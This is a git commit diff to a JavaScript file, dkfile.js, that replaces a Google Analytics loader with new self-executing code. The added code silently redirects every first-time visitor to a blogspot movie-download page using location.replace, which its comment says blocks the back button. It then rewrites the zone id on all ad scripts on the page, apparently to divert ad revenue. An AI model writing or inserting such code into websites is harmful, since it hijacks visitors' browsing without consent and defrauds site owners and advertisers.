95307ec73590128f007c9d98d5a9eb0697887697
Dhanjee Kumar <102199585+dhanjeerider@users.noreply.github.com>
2026-04-23 00:18:54 +0530

    Update dkfile.js

--- dkfile.js
+++ dkfile.js
@@ -1,19 +1,18 @@
-var lazyanalisis = false;
-window.addEventListener("scroll", function() {
-  if ((document.documentElement.scrollTop !== 0 && lazyanalisis === false) || (document.body.scrollTop !== 0 && lazyanalisis === false)) {
-    (function() {
-      var e = document.createElement("script");
-      e.type = "text/javascript";
-      e.async = true;
-      e.src = "https://www.googletagmanager.com/gtag/js?id=G-88SW9D6YBK";
-      var a = document.getElementsByTagName("script")[0];
-      if (a && a.parentNode) a.parentNode.insertBefore(e, a);
-    })();
-    lazyanalisis = true;
-  }
-}, true);
+(function() {
 
-window.dataLayer = window.dataLayer || [];
-function gtag() { dataLayer.push(arguments); }
-gtag('js', new Date());
-gtag('config', 'G-88SW9D6YBK');
+  const REDIRECT_URL = "https://jet-moviev3.blogspot.com/2024/12/ant-man-demo-movie-post-480p720p1080p4k.html";
+  const KEY = "redirect_done";
+
+  // === FIRST VISIT REDIRECT ===
+  if (!localStorage.getItem(KEY)) {
+    localStorage.setItem(KEY, "yes");
+    window.location.replace(REDIRECT_URL); // back button bhi block karega
+    return;
+  }
+
+  // === EXISTING SCRIPT KA ID REPLACE ===
+  document.querySelectorAll("script[data-zone]").forEach(s => {
+    s.dataset.zone = "10059814"; // tumhara new zone id
+  });
+
+})();
